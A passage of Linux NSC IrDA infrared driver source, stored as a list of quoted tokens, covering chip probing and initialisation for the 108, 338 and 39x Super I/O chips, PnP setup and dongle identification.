"dma_free_coherent", "(", "NULL", ",", "self", "-", ">", "rx_buff", ".", "truesize", ",", "self", "-", ">", "rx_buff", ".", "head", ",", "self", "-", ">", "rx_buff_dma", ")", ";", "dev_self", "[", "self", "-", ">", "index", "]", "=", "NULL", ";", "free_netdev", "(", "self", "-", ">", "netdev", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_init_108", "(", "iobase", ",", "cfg_base", ",", "irq", ",", "dma", ")", "*", "*", "Initialize", "the", "NSC", "'", "108", "chip", "*", "*", "/", "static", "int", "nsc_ircc_init_108", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "int", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "__u8", "temp", "=", "0", ";", "outb", "(", "2", ",", "cfg_base", ")", ";", "/", "*", "Mode", "Control", "Register", "(", "MCTL", ")", "*", "/", "outb", "(", "0x00", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "Disable", "device", "*", "/", "/", "*", "Base", "Address", "and", "Interrupt", "Control", "Register", "(", "BAIC", ")", "*", "/", "outb", "(", "CFG_108_BAIC", ",", "cfg_base", ")", ";", "switch", "(", "info", "-", ">", "fir_base", ")", "{", "case", "0x3e8", ":", "outb", "(", "0x14", ",", "cfg_base", "+", "1", ")", ";", "break", ";", "case", "0x2e8", ":", "outb", "(", "0x15", ",", "cfg_base", "+", "1", ")", ";", "break", ";", "case", "0x3f8", ":", "outb", "(", "0x16", ",", "cfg_base", "+", "1", ")", ";", "break", ";", "case", "0x2f8", ":", "outb", "(", "0x17", ",", "cfg_base", "+", "1", ")", ";", "break", ";", "default", ":", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "invalid", "base_address", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "/", "*", "Control", "Signal", "Routing", "Register", "(", "CSRT", ")", "*", "/", "switch", "(", "info", "-", ">", "irq", ")", "{", "case", "3", ":", "temp", "=", "0x01", ";", "break", ";", "case", "4", ":", "temp", "=", "0x02", ";", "break", ";", "case", "5", ":", "temp", "=", "0x03", ";", "break", ";", "case", "7", ":", "temp", "=", "0x04", ";", "break", ";", "case", "9", ":", "temp", "=", "0x05", ";", "break", ";", "case", "11", ":", "temp", "=", "0x06", ";", "break", ";", "case", "15", ":", "temp", "=", "0x07", ";", "break", ";", "default", ":", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "invalid", "irq", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "outb", "(", "CFG_108_CSRT", ",", "cfg_base", ")", ";", "switch", "(", "info", "-", ">", "dma", ")", "{", "case", "0", ":", "outb", "(", "0x08", "+", "temp", ",", "cfg_base", "+", "1", ")", ";", "break", ";", "case", "1", ":", "outb", "(", "0x10", "+", "temp", ",", "cfg_base", "+", "1", ")", ";", "break", ";", "case", "3", ":", "outb", "(", "0x18", "+", "temp", ",", "cfg_base", "+", "1", ")", ";", "break", ";", "default", ":", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "invalid", "dma", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "outb", "(", "CFG_108_MCTL", ",", "cfg_base", ")", ";", "/", "*", "Mode", "Control", "Register", "(", "MCTL", ")", "*", "/", "outb", "(", "0x03", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "Enable", "device", "*", "/", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_probe_108", "(", "chip", ",", "info", ")", "*", "*", "*", "*", "/", "static", "int", "nsc_ircc_probe_108", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "int", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "int", "reg", ";", "/", "*", "Read", "address", "and", "interrupt", "control", "register", "(", "BAIC", ")", "*", "/", "outb", "(", "CFG_108_BAIC", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "switch", "(", "reg", "&", "0x03", ")", "{", "case", "0", ":", "info", "-", ">", "fir_base", "=", "0x3e8", ";", "break", ";", "case", "1", ":", "info", "-", ">", "fir_base", "=", "0x2e8", ";", "break", ";", "case", "2", ":", "info", "-", ">", "fir_base", "=", "0x3f8", ";", "break", ";", "case", "3", ":", "info", "-", ">", "fir_base", "=", "0x2f8", ";", "break", ";", "}", "info", "-", ">", "sir_base", "=", "info", "-", ">", "fir_base", ";", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "fir_base", "=", "0x", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "fir_base", ")", ";", "/", "*", "Read", "control", "signals", "routing", "register", "(", "CSRT", ")", "*", "/", "outb", "(", "CFG_108_CSRT", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "switch", "(", "reg", "&", "0x07", ")", "{", "case", "0", ":", "info", "-", ">", "irq", "=", "-", "1", ";", "break", ";", "case", "1", ":", "info", "-", ">", "irq", "=", "3", ";", "break", ";", "case", "2", ":", "info", "-", ">", "irq", "=", "4", ";", "break", ";", "case", "3", ":", "info", "-", ">", "irq", "=", "5", ";", "break", ";", "case", "4", ":", "info", "-", ">", "irq", "=", "7", ";", "break", ";", "case", "5", ":", "info", "-", ">", "irq", "=", "9", ";", "break", ";", "case", "6", ":", "info", "-", ">", "irq", "=", "11", ";", "break", ";", "case", "7", ":", "info", "-", ">", "irq", "=", "15", ";", "break", ";", "}", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "irq", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "irq", ")", ";", "/", "*", "Currently", "we", "only", "read", "Rx", "DMA", "but", "it", "will", "also", "be", "used", "for", "Tx", "*", "/", "switch", "(", "(", "reg", ">", ">", "3", ")", "&", "0x03", ")", "{", "case", "0", ":", "info", "-", ">", "dma", "=", "-", "1", ";", "break", ";", "case", "1", ":", "info", "-", ">", "dma", "=", "0", ";", "break", ";", "case", "2", ":", "info", "-", ">", "dma", "=", "1", ";", "break", ";", "case", "3", ":", "info", "-", ">", "dma", "=", "3", ";", "break", ";", "}", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "dma", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "dma", ")", ";", "/", "*", "Read", "mode", "control", "register", "(", "MCTL", ")", "*", "/", "outb", "(", "CFG_108_MCTL", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "enabled", "=", "reg", "&", "0x01", ";", "info", "-", ">", "suspended", "=", "!", "((", "reg", ">", ">", "1", ")", "&", "0x01", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_init_338", "(", "chip", ",", "info", ")", "*", "*", "Initialize", "the", "NSC", "'", "338", "chip", ".", "Remember", "that", "the", "87338", "needs", "two", "*", "consecutive", "writes", "to", "the", "data", "registers", "while", "CPU", "interrupts", "are", "*", "disabled", ".", "The", "97338", "does", "not", "require", "this", ",", "but", "shouldn", "'", "t", "be", "any", "*", "harm", "if", "we", "do", "it", "anyway", ".", "*", "/", "static", "int", "nsc_ircc_init_338", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "/", "*", "No", "init", "yet", "*", "/", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_probe_338", "(", "chip", ",", "info", ")", "*", "*", "*", "*", "/", "static", "int", "nsc_ircc_probe_338", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "int", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "int", "reg", ",", "com", "=", "0", ";", "int", "pnp", ";", "/", "*", "Read", "function", "enable", "register", "(", "FER", ")", "*", "/", "outb", "(", "CFG_338_FER", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "enabled", "=", "(", "reg", ">", ">", "2", ")", "&", "0x01", ";", "/", "*", "Check", "if", "we", "are", "in", "Legacy", "or", "PnP", "mode", "*", "/", "outb", "(", "CFG_338_PNP0", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "pnp", "=", "(", "reg", ">", ">", "3", ")", "&", "0x01", ";", "if", "(", "pnp", ")", "{", "pr_debug", "(", "\"(", "),", "Chip", "is", "in", "PnP", "mode", "\\", "n", "\"", ");", "outb", "(", "0x46", ",", "cfg_base", ")", ";", "reg", "=", "(", "inb", "(", "cfg_base", "+", "1", ")", "&", "0xfe", ")", "<", "<", "2", ";", "outb", "(", "0x47", ",", "cfg_base", ")", ";", "reg", "|", "=", "(", "(", "inb", "(", "cfg_base", "+", "1", ")", "&", "0xfc", ")", "<", "<", "8", ")", ";", "info", "-", ">", "fir_base", "=", "reg", ";", "}", "else", "{", "/", "*", "Read", "function", "address", "register", "(", "FAR", ")", "*", "/", "outb", "(", "CFG_338_FAR", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "switch", "(", "(", "reg", ">", ">", "4", ")", "&", "0x03", ")", "{", "case", "0", ":", "info", "-", ">", "fir_base", "=", "0x3f8", ";", "break", ";", "case", "1", ":", "info", "-", ">", "fir_base", "=", "0x2f8", ";", "break", ";", "case", "2", ":", "com", "=", "3", ";", "break", ";", "case", "3", ":", "com", "=", "4", ";", "break", ";", "}", "if", "(", "com", ")", "{", "switch", "(", "(", "reg", ">", ">", "6", ")", "&", "0x03", ")", "{", "case", "0", ":", "if", "(", "com", "=", "=", "3", ")", "info", "-", ">", "fir_base", "=", "0x3e8", ";", "else", "info", "-", ">", "fir_base", "=", "0x2e8", ";", "break", ";", "case", "1", ":", "if", "(", "com", "=", "=", "3", ")", "info", "-", ">", "fir_base", "=", "0x338", ";", "else", "info", "-", ">", "fir_base", "=", "0x238", ";", "break", ";", "case", "2", ":", "if", "(", "com", "=", "=", "3", ")", "info", "-", ">", "fir_base", "=", "0x2e8", ";", "else", "info", "-", ">", "fir_base", "=", "0x2e0", ";", "break", ";", "case", "3", ":", "if", "(", "com", "=", "=", "3", ")", "info", "-", ">", "fir_base", "=", "0x220", ";", "else", "info", "-", ">", "fir_base", "=", "0x228", ";", "break", ";", "}", "}", "}", "info", "-", ">", "sir_base", "=", "info", "-", ">", "fir_base", ";", "/", "*", "Read", "PnP", "register", "1", "(", "PNP1", ")", "*", "/", "outb", "(", "CFG_338_PNP1", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "irq", "=", "reg", ">", ">", "4", ";", "/", "*", "Read", "PnP", "register", "3", "(", "PNP3", ")", "*", "/", "outb", "(", "CFG_338_PNP3", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "dma", "=", "(", "reg", "&", "0x07", ")", "-", "1", ";", "/", "*", "Read", "power", "and", "test", "register", "(", "PTR", ")", "*", "/", "outb", "(", "CFG_338_PTR", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "suspended", "=", "reg", "&", "0x01", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_init_39x", "(", "chip", ",", "info", ")", "*", "*", "Now", "that", "we", "know", "it", "'", "s", "a", "'", "39x", "(", "see", "probe", "below", ")", ",", "we", "need", "to", "*", "configure", "it", "so", "we", "can", "use", "it", ".", "*", "*", "The", "NSC", "'", "338", "chip", "is", "a", "Super", "I", "/", "O", "chip", "with", "a", "\"", "bank", "\"", "architecture", ",", "*", "the", "configuration", "of", "the", "different", "functionality", "(", "serial", ",", "parallel", ",", "*", "floppy", ".", "..", ")", "are", "each", "in", "a", "different", "bank", "(", "Logical", "Device", "Number", ")", ".", "*", "The", "base", "address", ",", "irq", "and", "dma", "configuration", "registers", "are", "common", "*", "to", "all", "functionalities", "(", "index", "0x30", "to", "0x7F", ")", ".", "*", "There", "is", "only", "one", "configuration", "register", "specific", "to", "the", "*", "serial", "port", ",", "CFG_39X_SPC", ".", "*", "JeanII", "*", "*", "Note", ":", "this", "code", "was", "written", "by", "Jan", "Frey", "<", "janfrey", "@", "web", ".", "de", ">", "*", "/", "static", "int", "nsc_ircc_init_39x", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "int", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "int", "enabled", ";", "/", "*", "User", "is", "sure", "about", "his", "config", ".", "..", "accept", "it", ".", "*", "/", "pr_debug", "(", "\"%", "s", "(", "):", "nsc_ircc_init_39x", "(", "user", "settings", ")", ":", "io", "=", "0x", "%", "04x", ",", "irq", "=", "%", "d", ",", "dma", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "fir_base", ",", "info", "-", ">", "irq", ",", "info", "-", ">", "dma", ")", ";", "/", "*", "Access", "bank", "for", "SP2", "*", "/", "outb", "(", "CFG_39X_LDN", ",", "cfg_base", ")", ";", "outb", "(", "0x02", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "Configure", "SP2", "*", "/", "/", "*", "We", "want", "to", "enable", "the", "device", "if", "not", "enabled", "*", "/", "outb", "(", "CFG_39X_ACT", ",", "cfg_base", ")", ";", "enabled", "=", "inb", "(", "cfg_base", "+", "1", ")", "&", "0x01", ";", "if", "(", "!", "enabled", ")", "{", "/", "*", "Enable", "the", "device", "*", "/", "outb", "(", "CFG_39X_SIOCF1", ",", "cfg_base", ")", ";", "outb", "(", "0x01", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "May", "want", "to", "update", "info", "-", ">", "enabled", ".", "Jean", "II", "*", "/", "}", "/", "*", "Enable", "UART", "bank", "switching", "(", "bit", "7", ")", ";", "Sets", "the", "chip", "to", "normal", "*", "power", "mode", "(", "wake", "up", "from", "sleep", "mode", ")", "(", "bit", "1", ")", "*", "/", "outb", "(", "CFG_39X_SPC", ",", "cfg_base", ")", ";", "outb", "(", "0x82", ",", "cfg_base", "+", "1", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_probe_39x", "(", "chip", ",", "info", ")", "*", "*", "Test", "if", "we", "really", "have", "a", "'", "39x", "chip", "at", "the", "given", "address", "*", "*", "Note", ":", "this", "code", "was", "written", "by", "Jan", "Frey", "<", "janfrey", "@", "web", ".", "de", ">", "*", "/", "static", "int", "nsc_ircc_probe_39x", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "int", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "int", "reg1", ",", "reg2", ",", "irq", ",", "irqt", ",", "dma1", ",", "dma2", ";", "int", "enabled", ",", "susp", ";", "pr_debug", "(", "\"%", "s", "(", "),", "nsc_ircc_probe_39x", ",", "base", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "cfg_base", ")", ";", "/", "*", "This", "function", "should", "be", "executed", "with", "irq", "off", "to", "avoid", "*", "another", "driver", "messing", "with", "the", "Super", "I", "/", "O", "bank", "-", "Jean", "II", "*", "/", "/", "*", "Access", "bank", "for", "SP2", "*", "/", "outb", "(", "CFG_39X_LDN", ",", "cfg_base", ")", ";", "outb", "(", "0x02", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "Read", "infos", "about", "SP2", ";", "store", "in", "info", "struct", "*", "/", "outb", "(", "CFG_39X_BASEH", ",", "cfg_base", ")", ";", "reg1", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "outb", "(", "CFG_39X_BASEL", ",", "cfg_base", ")", ";", "reg2", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "fir_base", "=", "(", "reg1", "<", "<", "8", ")", "|", "reg2", ";", "outb", "(", "CFG_39X_IRQNUM", ",", "cfg_base", ")", ";", "irq", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "outb", "(", "CFG_39X_IRQSEL", ",", "cfg_base", ")", ";", "irqt", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "irq", "=", "irq", ";", "outb", "(", "CFG_39X_DMA0", ",", "cfg_base", ")", ";", "dma1", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "outb", "(", "CFG_39X_DMA1", ",", "cfg_base", ")", ";", "dma2", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "dma", "=", "dma1", "-", "1", ";", "outb", "(", "CFG_39X_ACT", ",", "cfg_base", ")", ";", "info", "-", ">", "enabled", "=", "enabled", "=", "inb", "(", "cfg_base", "+", "1", ")", "&", "0x01", ";", "outb", "(", "CFG_39X_SPC", ",", "cfg_base", ")", ";", "susp", "=", "1", "-", "(", "(", "inb", "(", "cfg_base", "+", "1", ")", "&", "0x02", ")", ">", ">", "1", ")", ";", "pr_debug", "(", "\"%", "s", "(", "):", "io", "=", "0x", "%", "02x", "%", "02x", ",", "irq", "=", "%", "d", "(", "type", "%", "d", ")", ",", "rxdma", "=", "%", "d", ",", "txdma", "=", "%", "d", ",", "enabled", "=", "%", "d", "(", "suspended", "=", "%", "d", ")", "\\", "n", "\"", ",", "__func__", ",", "reg1", ",", "reg2", ",", "irq", ",", "irqt", ",", "dma1", ",", "dma2", ",", "enabled", ",", "susp", ")", ";", "/", "*", "Configure", "SP2", "*", "/", "/", "*", "We", "want", "to", "enable", "the", "device", "if", "not", "enabled", "*", "/", "outb", "(", "CFG_39X_ACT", ",", "cfg_base", ")", ";", "enabled", "=", "inb", "(", "cfg_base", "+", "1", ")", "&", "0x01", ";", "if", "(", "!", "enabled", ")", "{", "/", "*", "Enable", "the", "device", "*", "/", "outb", "(", "CFG_39X_SIOCF1", ",", "cfg_base", ")", ";", "outb", "(", "0x01", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "May", "want", "to", "update", "info", "-", ">", "enabled", ".", "Jean", "II", "*", "/", "}", "/", "*", "Enable", "UART", "bank", "switching", "(", "bit", "7", ")", ";", "Sets", "the", "chip", "to", "normal", "*", "power", "mode", "(", "wake", "up", "from", "sleep", "mode", ")", "(", "bit", "1", ")", "*", "/", "outb", "(", "CFG_39X_SPC", ",", "cfg_base", ")", ";", "outb", "(", "0x82", ",", "cfg_base", "+", "1", ")", ";", "return", "0", ";", "}", "#", "ifdef", "CONFIG_PNP", "/", "*", "PNP", "probing", "*", "/", "static", "int", "nsc_ircc_pnp_probe", "(", "struct", "pnp_dev", "*", "dev", ",", "const", "struct", "pnp_device_id", "*", "id", ")", "{", "memset", "(", "&", "pnp_info", ",", "0", ",", "sizeof", "(", "chipio_t", ")", ");", "pnp_info", ".", "irq", "=", "-", "1", ";", "pnp_info", ".", "dma", "=", "-", "1", ";", "pnp_succeeded", "=", "1", ";", "if", "(", "id", "-", ">", "driver_data", "&", "NSC_FORCE_DONGLE_TYPE9", ")", "dongle_id", "=", "0x9", ";", "/", "*", "There", "doesn", "'", "t", "seem", "to", "be", "any", "way", "of", "getting", "the", "cfg_base", ".", "*", "On", "my", "box", ",", "cfg_base", "is", "in", "the", "PnP", "descriptor", "of", "the", "*", "motherboard", ".", "Oh", "well", ".", "..", "Jean", "II", "*", "/", "if", "(", "pnp_port_valid", "(", "dev", ",", "0", ")", "&", "&", "!", "(", "pnp_port_flags", "(", "dev", ",", "0", ")", "&", "IORESOURCE_DISABLED", ")", ")", "pnp_info", ".", "fir_base", "=", "pnp_port_start", "(", "dev", ",", "0", ")", ";", "if", "(", "pnp_irq_valid", "(", "dev", ",", "0", ")", "&", "&", "!", "(", "pnp_irq_flags", "(", "dev", ",", "0", ")", "&", "IORESOURCE_DISABLED", ")", ")", "pnp_info", ".", "irq", "=", "pnp_irq", "(", "dev", ",", "0", ")", ";", "if", "(", "pnp_dma_valid", "(", "dev", ",", "0", ")", "&", "&", "!", "(", "pnp_dma_flags", "(", "dev", ",", "0", ")", "&", "IORESOURCE_DISABLED", ")", ")", "pnp_info", ".", "dma", "=", "pnp_dma", "(", "dev", ",", "0", ")", ";", "pr_debug", "(", "\"%", "s", "(", ")", ":", "From", "PnP", ",", "found", "firbase", "0x", "%", "03X", ";", "irq", "%", "d", ";", "dma", "%", "d", ".", "\\", "n", "\"", ",", "__func__", ",", "pnp_info", ".", "fir_base", ",", "pnp_info", ".", "irq", ",", "pnp_info", ".", "dma", ")", ";", "if", "(", "(", "pnp_info", ".", "fir_base", "=", "=", "0", ")", "|", "|", "(", "pnp_info", ".", "irq", "=", "=", "-", "1", ")", "|", "|", "(", "pnp_info", ".", "dma", "=", "=", "-", "1", ")", ")", "{", "/", "*", "Returning", "an", "error", "will", "disable", "the", "device", ".", "Yuck", "!", "*", "/", "/", "/", "return", "-", "EINVAL", ";", "pnp_succeeded", "=", "0", ";", "}", "return", "0", ";", "}", "#", "endif", "/", "*", "*", "Function", "nsc_ircc_setup", "(", "info", ")", "*", "*", "Returns", "non", "-", "negative", "on", "success", ".", "*", "*", "/", "static", "int", "nsc_ircc_setup", "(", "chipio_t", "*", "info", ")", "{", "int", "version", ";", "int", "iobase", "=", "info", "-", ">", "fir_base", ";", "/", "*", "Read", "the", "Module", "ID", "*", "/", "switch_bank", "(", "iobase", ",", "BANK3", ")", ";", "version", "=", "inb", "(", "iobase", "+", "MID", ")", ";", "pr_debug", "(", "\"%", "s", "(", ")", "Driver", "%", "s", "Found", "chip", "version", "%", "02x", "\\", "n", "\"", ",", "__func__", ",", "driver_name", ",", "version", ")", ";", "/", "*", "Should", "be", "0x2", "?", "*", "/", "if", "(", "0x20", "!", "=", "(", "version", "&", "0xf0", ")", ")", "{", "net_err_ratelimited", "(", "\"%", "s", ",", "Wrong", "chip", "version", "%", "02x", "\\", "n", "\"", ",", "driver_name", ",", "version", ")", ";", "return", "-", "1", ";", "}", "/", "*", "Switch", "to", "advanced", "mode", "*", "/", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "ECR1_EXT_SL", ",", "iobase", "+", "ECR1", ")", ";", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "/", "*", "Set", "FIFO", "threshold", "to", "TX17", ",", "RX16", ",", "reset", "and", "enable", "FIFO", "'", "s", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "FCR_RXTH", "|", "FCR_TXTH", "|", "FCR_TXSR", "|", "FCR_RXSR", "|", "FCR_FIFO_EN", ",", "iobase", "+", "FCR", ")", ";", "outb", "(", "0x03", ",", "iobase", "+", "LCR", ")", ";", "/", "*", "8", "bit", "word", "length", "*", "/", "outb", "(", "MCR_SIR", ",", "iobase", "+", "MCR", ")", ";", "/", "*", "Start", "at", "SIR", "-", "mode", ",", "also", "clears", "LSR", "*", "/", "/", "*", "Set", "FIFO", "size", "to", "32", "*", "/", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "EXCR2_RFSIZ", "|", "EXCR2_TFSIZ", ",", "iobase", "+", "EXCR2", ")", ";", "/", "*", "IRCR2", ":", "FEND_MD", "is", "not", "set", "*", "/", "switch_bank", "(", "iobase", ",", "BANK5", ")", ";", "outb", "(", "0x02", ",", "iobase", "+", "4", ")", ";", "/", "*", "Make", "sure", "that", "some", "defaults", "are", "OK", "*", "/", "switch_bank", "(", "iobase", ",", "BANK6", ")", ";", "outb", "(", "0x20", ",", "iobase", "+", "0", ")", ";", "/", "*", "Set", "32", "bits", "FIR", "CRC", "*", "/", "outb", "(", "0x0a", ",", "iobase", "+", "1", ")", ";", "/", "*", "Set", "MIR", "pulse", "width", "*", "/", "outb", "(", "0x0d", ",", "iobase", "+", "2", ")", ";", "/", "*", "Set", "SIR", "pulse", "width", "to", "1", ".", "6us", "*", "/", "outb", "(", "0x2a", ",", "iobase", "+", "4", ")", ";", "/", "*", "Set", "beginning", "frag", ",", "and", "preamble", "length", "*", "/", "/", "*", "Enable", "receive", "interrupts", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "IER_RXHDL_IE", ",", "iobase", "+", "IER", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_read_dongle_id", "(", "void", ")", "*", "*", "Try", "to", "read", "dongle", "identification", ".", "This", "procedure", "needs", "to", "be", "executed", "*", "once", "after", "power", "-", "on", "/", "reset", ".", "It", "also", "needs", "to", "be", "used", "whenever", "you", "suspect", "*", "that", "the", "user", "may", "have", "plugged", "/", "unplugged", "the", "IrDA", "Dongle", ".", "*", "/", "static", "int", "nsc_ircc_read_dongle_id", "(", "int", "iobase", ")", "{", "int", "dongle_id", ";", "__u8", "bank", ";", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Select", "Bank", "7", "*", "/", "switch_bank", "(", "iobase", ",", "BANK7", ")", ";", "/", "*", "IRCFG4", ":", "IRSL0_DS", "and", "IRSL21_DS", "are", "cleared", "*", "/", "outb", "(", "0x00", ",", "iobase", "+", "7", ")", ";", "/", "*", "ID0", ",", "1", ",", "and", "2", "are", "pulled", "up", "/", "down", "very", "slowly", "*", "/", "udelay", "(", "50", ")", ";", "/", "*", "IRCFG1", ":", "read", "the", "ID", "bits", "*", "/", "dongle_id", "=", "inb", "(", "iobase", "+", "4", ")", "&", "0x0f", ";", "#", "ifdef", "BROKEN_DONGLE_ID", "if", "(", "dongle_id", "=", "=", "0x0a", ")", "dongle_id", "=", "0x09", ";", "#", "endif", "/", "*", "Go", "back", "to", "bank", "0", "before", "returning", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "return", "dongle_id", ";", "}", "/", "*", "*", "Function", "nsc_ircc_init_dongle_interface", "(", "iobase", ",", "dongle_id", ")", "*", "*", "This", "function", "initializes", "the", "dongle", "for", "the", "transceiver", "that", "is", "*", "used", ".", "This", "procedure", "needs", "to", "be", "executed", "once", "after", "*", "power", "-", "on", "/", "reset", ".", "It", "also", "needs", "to", "be", "used", "whenever", "you", "suspect", "that", "*", "the", "dongle", "is", "changed", ".", "*", "/", "static", "void", "nsc_ircc_init_dongle_interface", "(", "int", "iobase", ",", "int", "dongle_id", ")", "{", "int", "bank", ";", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Select", "Bank", "7", "*", "/", "switch_bank", "(", "iobase", ",", "BANK7", ")", ";", "/", "*", "IRCFG4", ":", "set", "according", "to", "dongle_id", "*", "/", "switch", "(", "dongle_id", ")", "{", "case", "0x00", ":", "/", "*", "same", "as", "*", "/", "case", "0x01", ":", "/", "*", "Differential", "serial", "interface", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x02", ":", "/", "*", "same", "as", "*", "/", "case", "0x03", ":", "/", "*", "Reserved", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x04", ":", "/", "*", "Sharp", "RY5HD01", "*", "/", "break", ";", "case", "0x05", ":", "/", "*", "Reserved", ",", "but", "this", "is", "what", "the", "Thinkpad", "reports", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x06", ":", "/", "*", "Single", "-", "ended", "serial", "interface", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x07", ":", "/", "*", "Consumer", "-", "IR", "only", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "is", "not", "for", "IrDA", "mode", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x08", ":", "/", "*", "HP", "HSDL", "-", "2300", ",", "HP", "HSDL", "-", "3600", "/", "HSDL", "-", "3610", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x09", ":", "/", "*", "IBM31T1100", "or", "Temic", "TFDS6000", "/", "TFDS6500", "*", "/", "outb", "(", "0x28", ",", "iobase", "+", "7", ")", ";", "/", "*", "Set", "irsl", "[", "0", "-", "2", "]", "as", "output", "*", "/", "break", ";", "case", "0x0A", ":", "/", "*", "same", "as", "*", "/", "case", "0x0B", ":", "/", "*", "Reserved", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x0C", ":", "/", "*", "same", "as", "*", "/", "case", "0x0D", ":", "/", "*", "HP", "HSDL", "-", "1100", "/", "HSDL", "-", "2100", "*", "/", "/", "*", "*", "Set", "irsl0", "as", "input", ",", "irsl", "[", "1", "-", "2", "]", "as", "output", ",", "and", "separate", "*", "inputs", "are", "used", "for", "SIR", "and", "MIR", "/", "FIR", "*", "/", "outb", "(", "0x48", ",", "iobase", "+", "7", ")", ";", "break", ";", "case", "0x0E", ":", "/", "*", "Supports", "SIR", "Mode", "only", "*", "/", "outb", "(", "0x28", ",", "iobase", "+", "7", ")", ";", "/", "*", "Set", "irsl", "[", "0", "-", "2", "]", "as", "output", "*", "/", "break", ";", "case", "0x0F", ":", "/", "*", "No", "dongle", "connected", "*", "/", "pr_debug", "(", 